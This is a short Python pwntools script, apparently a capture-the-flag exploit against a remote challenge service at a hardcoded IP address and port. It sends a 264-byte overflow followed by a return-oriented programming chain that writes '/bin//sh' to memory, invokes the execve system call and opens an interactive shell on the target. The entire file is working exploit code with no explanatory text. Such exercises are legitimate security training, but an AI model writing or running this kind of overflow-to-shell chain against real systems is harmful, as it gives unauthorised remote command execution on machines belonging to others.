from pwn import *

#R = process('./chall')
R = remote('13.231.207.73', 9010)

def gen_payload():
    offset = 264
    pop_rdi = 0x40141c
    pop_rsi_r15 = 0x40141a
    mov_prdi_rax = 0x400704
    pop_rdx = 0x4023f5
    pop_rax = 0x400121
    syscall = 0x402ea1
    bss_mybuf = 0x603fa8

    payload = b"A"*offset
    payload += p64(pop_rdi)
    payload += p64(bss_mybuf)
    payload += p64(pop_rax)
    payload += b"/bin//sh"
    payload += p64(mov_prdi_rax)
    payload += p64(pop_rsi_r15)
    payload += p64(0)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)
    return payload

def main(r):
    r.recvuntil('your team name?\n')
    r.sendline(gen_payload())
    r.interactive()

if __name__ == '__main__':
    main(R)
